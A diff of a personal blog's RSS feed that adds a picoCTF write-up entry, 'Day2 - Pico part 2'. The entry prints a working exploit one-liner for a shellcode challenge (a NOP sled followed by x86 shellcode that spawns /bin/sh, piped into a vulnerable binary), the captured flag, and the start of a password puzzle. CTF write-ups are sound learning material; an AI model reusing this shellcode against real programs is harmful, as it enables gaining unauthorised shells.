@@ -6,10 +6,22 @@
     <description>Recent content on Danil Delegator&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 16 Apr 2020 11:45:06 +0300</lastBuildDate>
+    <lastBuildDate>Fri, 17 Apr 2020 12:43:50 +0300</lastBuildDate>
     
 	<atom:link href="https://danildelegator.github.io/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Day2 - Pico part 2</title>
+      <link>https://danildelegator.github.io/day2/</link>
+      <pubDate>Fri, 17 Apr 2020 12:43:50 +0300</pubDate>
+      
+      <guid>https://danildelegator.github.io/day2/</guid>
+      <description>slippery-shellcode (200p) From the source code I can see that the shellcode is executed from a random point in the payload between 0 and 256 so the payload should contain a bunch of NOP instructions before the actual shellcode.
+(python -c &amp;#39;print(&amp;#34;\x90&amp;#34;*300 + &amp;#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&amp;#34;)&amp;#39;; cat) | ./vuln The cat trick is so that I can use the shell I just popped.
+cat the flag: picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}
+vault-door-3 (200p) buffer = list(&amp;#34;jU5t_a_sna_3lpm11ga4e_u_4_m9rf48&amp;#34;) password = list(&amp;#34;?</description>
+    </item>
     
     <item>
       <title>Day1 - Pico part 1</title>
